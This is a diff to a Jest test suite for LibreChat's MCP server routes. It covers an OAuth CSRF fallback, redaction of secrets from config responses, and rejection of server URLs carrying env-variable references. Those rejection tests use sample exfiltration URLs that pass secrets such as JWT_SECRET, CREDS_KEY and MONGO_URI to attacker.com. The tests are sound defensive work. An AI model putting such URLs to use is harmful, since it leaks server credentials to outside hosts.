@@ -32,6 +32,9 @@ jest.mock('@librechat/api', () => {
       getFlowState: jest.fn(),
       completeOAuthFlow: jest.fn(),
       generateFlowId: jest.fn(),
+      resolveStateToFlowId: jest.fn(async (state) => state),
+      storeStateMapping: jest.fn(),
+      deleteStateMapping: jest.fn(),
     },
     MCPTokenStorage: {
       storeTokens: jest.fn(),
@@ -180,7 +183,10 @@ describe('MCP Routes', () => {
       MCPOAuthHandler.initiateOAuthFlow.mockResolvedValue({
         authorizationUrl: 'https://oauth.example.com/auth',
         flowId: 'test-user-id:test-server',
+        flowMetadata: { state: 'random-state-value' },
       });
+      MCPOAuthHandler.storeStateMapping.mockResolvedValue();
+      mockFlowManager.initFlow = jest.fn().mockResolvedValue();
 
       const response = await request(app).get('/api/mcp/test-server/oauth/initiate').query({
         userId: 'test-user-id',
@@ -365,6 +371,121 @@ describe('MCP Routes', () => {
 
       expect(response.status).toBe(302);
       expect(response.headers.location).toBe(`${basePath}/oauth/error?error=invalid_state`);
+    });
+
+    describe('CSRF fallback via active PENDING flow', () => {
+      it('should proceed when a fresh PENDING flow exists and no cookies are present', async () => {
+        const flowId = 'test-user-id:test-server';
+        const mockFlowManager = {
+          getFlowState: jest.fn().mockResolvedValue({
+            status: 'PENDING',
+            createdAt: Date.now(),
+          }),
+          completeFlow: jest.fn().mockResolvedValue(true),
+          deleteFlow: jest.fn().mockResolvedValue(true),
+        };
+        const mockFlowState = {
+          serverName: 'test-server',
+          userId: 'test-user-id',
+          metadata: {},
+          clientInfo: {},
+          codeVerifier: 'test-verifier',
+        };
+
+        getLogStores.mockReturnValue({});
+        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
+        MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
+        MCPOAuthHandler.completeOAuthFlow.mockResolvedValue({
+          access_token: 'test-token',
+        });
+        MCPTokenStorage.storeTokens.mockResolvedValue();
+        mockRegistryInstance.getServerConfig.mockResolvedValue({});
+
+        const mockMcpManager = {
+          getUserConnection: jest.fn().mockResolvedValue({
+            fetchTools: jest.fn().mockResolvedValue([]),
+          }),
+        };
+        require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
+        require('~/config').getOAuthReconnectionManager.mockReturnValue({
+          clearReconnection: jest.fn(),
+        });
+        require('~/server/services/Config/mcp').updateMCPServerTools.mockResolvedValue();
+
+        const response = await request(app)
+          .get('/api/mcp/test-server/oauth/callback')
+          .query({ code: 'test-code', state: flowId });
+
+        const basePath = getBasePath();
+        expect(response.status).toBe(302);
+        expect(response.headers.location).toContain(`${basePath}/oauth/success`);
+      });
+
+      it('should reject when no PENDING flow exists and no cookies are present', async () => {
+        const flowId = 'test-user-id:test-server';
+        const mockFlowManager = {
+          getFlowState: jest.fn().mockResolvedValue(null),
+        };
+
+        getLogStores.mockReturnValue({});
+        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
+
+        const response = await request(app)
+          .get('/api/mcp/test-server/oauth/callback')
+          .query({ code: 'test-code', state: flowId });
+
+        const basePath = getBasePath();
+        expect(response.status).toBe(302);
+        expect(response.headers.location).toBe(
+          `${basePath}/oauth/error?error=csrf_validation_failed`,
+        );
+      });
+
+      it('should reject when only a COMPLETED flow exists (not PENDING)', async () => {
+        const flowId = 'test-user-id:test-server';
+        const mockFlowManager = {
+          getFlowState: jest.fn().mockResolvedValue({
+            status: 'COMPLETED',
+            createdAt: Date.now(),
+          }),
+        };
+
+        getLogStores.mockReturnValue({});
+        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
+
+        const response = await request(app)
+          .get('/api/mcp/test-server/oauth/callback')
+          .query({ code: 'test-code', state: flowId });
+
+        const basePath = getBasePath();
+        expect(response.status).toBe(302);
+        expect(response.headers.location).toBe(
+          `${basePath}/oauth/error?error=csrf_validation_failed`,
+        );
+      });
+
+      it('should reject when PENDING flow is stale (older than PENDING_STALE_MS)', async () => {
+        const flowId = 'test-user-id:test-server';
+        const mockFlowManager = {
+          getFlowState: jest.fn().mockResolvedValue({
+            status: 'PENDING',
+            createdAt: Date.now() - 3 * 60 * 1000,
+          }),
+        };
+
+        getLogStores.mockReturnValue({});
+        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
+
+        const response = await request(app)
+          .get('/api/mcp/test-server/oauth/callback')
+          .query({ code: 'test-code', state: flowId });
+
+        const basePath = getBasePath();
+        expect(response.status).toBe(302);
+        expect(response.headers.location).toBe(
+          `${basePath}/oauth/error?error=csrf_validation_failed`,
+        );
+      });
     });
 
     it('should handle OAuth callback successfully', async () => {
@@ -1572,12 +1693,14 @@ describe('MCP Routes', () => {
     it('should return all server configs for authenticated user', async () => {
       const mockServerConfigs = {
         'server-1': {
-          endpoint: 'http://server1.com',
-          name: 'Server 1',
+          type: 'sse',
+          url: 'http://server1.com/sse',
+          title: 'Server 1',
         },
         'server-2': {
-          endpoint: 'http://server2.com',
-          name: 'Server 2',
+          type: 'sse',
+          url: 'http://server2.com/sse',
+          title: 'Server 2',
         },
       };
 
@@ -1586,7 +1709,18 @@ describe('MCP Routes', () => {
       const response = await request(app).get('/api/mcp/servers');
 
       expect(response.status).toBe(200);
-      expect(response.body).toEqual(mockServerConfigs);
+      expect(response.body['server-1']).toMatchObject({
+        type: 'sse',
+        url: 'http://server1.com/sse',
+        title: 'Server 1',
+      });
+      expect(response.body['server-2']).toMatchObject({
+        type: 'sse',
+        url: 'http://server2.com/sse',
+        title: 'Server 2',
+      });
+      expect(response.body['server-1'].headers).toBeUndefined();
+      expect(response.body['server-2'].headers).toBeUndefined();
       expect(mockRegistryInstance.getAllServerConfigs).toHaveBeenCalledWith('test-user-id');
     });
 
@@ -1641,10 +1775,10 @@ describe('MCP Routes', () => {
       const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });
 
       expect(response.status).toBe(201);
-      expect(response.body).toEqual({
-        serverName: 'test-sse-server',
-        ...validConfig,
-      });
+      expect(response.body.serverName).toBe('test-sse-server');
+      expect(response.body.type).toBe('sse');
+      expect(response.body.url).toBe('https://mcp-server.example.com/sse');
+      expect(response.body.title).toBe('Test SSE Server');
       expect(mockRegistryInstance.addServer).toHaveBeenCalledWith(
         'temp_server_name',
         expect.objectContaining({
@@ -1698,6 +1832,78 @@ describe('MCP Routes', () => {
       expect(response.body.message).toBe('Invalid configuration');
     });
 
+    it('should reject SSE URL containing env variable references', async () => {
+      const response = await request(app)
+        .post('/api/mcp/servers')
+        .send({
+          config: {
+            type: 'sse',
+            url: 'http://attacker.com/?secret=${JWT_SECRET}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject streamable-http URL containing env variable references', async () => {
+      const response = await request(app)
+        .post('/api/mcp/servers')
+        .send({
+          config: {
+            type: 'streamable-http',
+            url: 'http://attacker.com/?key=${CREDS_KEY}&iv=${CREDS_IV}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject websocket URL containing env variable references', async () => {
+      const response = await request(app)
+        .post('/api/mcp/servers')
+        .send({
+          config: {
+            type: 'websocket',
+            url: 'ws://attacker.com/?secret=${MONGO_URI}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
+    });
+
+    it('should redact secrets from create response', async () => {
+      const validConfig = {
+        type: 'sse',
+        url: 'https://mcp-server.example.com/sse',
+        title: 'Test Server',
+      };
+
+      mockRegistryInstance.addServer.mockResolvedValue({
+        serverName: 'test-server',
+        config: {
+          ...validConfig,
+          apiKey: { source: 'admin', authorization_type: 'bearer', key: 'admin-secret-key' },
+          oauth: { client_id: 'cid', client_secret: 'admin-oauth-secret' },
+          headers: { Authorization: 'Bearer leaked-token' },
+        },
+      });
+
+      const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });
+
+      expect(response.status).toBe(201);
+      expect(response.body.apiKey?.key).toBeUndefined();
+      expect(response.body.oauth?.client_secret).toBeUndefined();
+      expect(response.body.headers).toBeUndefined();
+      expect(response.body.apiKey?.source).toBe('admin');
+      expect(response.body.oauth?.client_id).toBe('cid');
+    });
+
     it('should return 500 when registry throws error', async () => {
       const validConfig = {
         type: 'sse',
@@ -1727,7 +1933,9 @@ describe('MCP Routes', () => {
       const response = await request(app).get('/api/mcp/servers/test-server');
 
       expect(response.status).toBe(200);
-      expect(response.body).toEqual(mockConfig);
+      expect(response.body.type).toBe('sse');
+      expect(response.body.url).toBe('https://mcp-server.example.com/sse');
+      expect(response.body.title).toBe('Test Server');
       expect(mockRegistryInstance.getServerConfig).toHaveBeenCalledWith(
         'test-server',
         'test-user-id',
@@ -1741,6 +1949,29 @@ describe('MCP Routes', () => {
 
       expect(response.status).toBe(404);
       expect(response.body).toEqual({ message: 'MCP server not found' });
+    });
+
+    it('should redact secrets from get response', async () => {
+      mockRegistryInstance.getServerConfig.mockResolvedValue({
+        type: 'sse',
+        url: 'https://mcp-server.example.com/sse',
+        title: 'Secret Server',
+        apiKey: { source: 'admin', authorization_type: 'bearer', key: 'decrypted-admin-key' },
+        oauth: { client_id: 'cid', client_secret: 'decrypted-oauth-secret' },
+        headers: { Authorization: 'Bearer internal-token' },
+        oauth_headers: { 'X-OAuth': 'secret-value' },
+      });
+
+      const response = await request(app).get('/api/mcp/servers/secret-server');
+
+      expect(response.status).toBe(200);
+      expect(response.body.title).toBe('Secret Server');
+      expect(response.body.apiKey?.key).toBeUndefined();
+      expect(response.body.apiKey?.source).toBe('admin');
+      expect(response.body.oauth?.client_secret).toBeUndefined();
+      expect(response.body.oauth?.client_id).toBe('cid');
+      expect(response.body.headers).toBeUndefined();
+      expect(response.body.oauth_headers).toBeUndefined();
     });
 
     it('should return 500 when registry throws error', async () => {
@@ -1769,7 +2000,9 @@ describe('MCP Routes', () => {
         .send({ config: updatedConfig });
 
       expect(response.status).toBe(200);
-      expect(response.body).toEqual(updatedConfig);
+      expect(response.body.type).toBe('sse');
+      expect(response.body.url).toBe('https://updated-mcp-server.example.com/sse');
+      expect(response.body.title).toBe('Updated Server');
       expect(mockRegistryInstance.updateServer).toHaveBeenCalledWith(
         'test-server',
         expect.objectContaining({
@@ -1779,6 +2012,35 @@ describe('MCP Routes', () => {
         'DB',
         'test-user-id',
       );
+    });
+
+    it('should redact secrets from update response', async () => {
+      const validConfig = {
+        type: 'sse',
+        url: 'https://mcp-server.example.com/sse',
+        title: 'Updated Server',
+      };
+
+      mockRegistryInstance.updateServer.mockResolvedValue({
+        ...validConfig,
+        apiKey: { source: 'admin', authorization_type: 'bearer', key: 'preserved-admin-key' },
+        oauth: { client_id: 'cid', client_secret: 'preserved-oauth-secret' },
+        headers: { Authorization: 'Bearer internal-token' },
+        env: { DATABASE_URL: 'postgres://admin:pass@localhost/db' },
+      });
+
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({ config: validConfig });
+
+      expect(response.status).toBe(200);
+      expect(response.body.title).toBe('Updated Server');
+      expect(response.body.apiKey?.key).toBeUndefined();
+      expect(response.body.apiKey?.source).toBe('admin');
+      expect(response.body.oauth?.client_secret).toBeUndefined();
+      expect(response.body.oauth?.client_id).toBe('cid');
+      expect(response.body.headers).toBeUndefined();
+      expect(response.body.env).toBeUndefined();
     });
 
     it('should return 400 for invalid configuration', async () => {
@@ -1795,6 +2057,51 @@ describe('MCP Routes', () => {
       expect(response.status).toBe(400);
       expect(response.body.message).toBe('Invalid configuration');
       expect(response.body.errors).toBeDefined();
+    });
+
+    it('should reject SSE URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'sse',
+            url: 'http://attacker.com/?secret=${JWT_SECRET}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject streamable-http URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'streamable-http',
+            url: 'http://attacker.com/?key=${CREDS_KEY}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject websocket URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'websocket',
+            url: 'ws://attacker.com/?secret=${MONGO_URI}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
     });
 
     it('should return 500 when registry throws error', async () => {
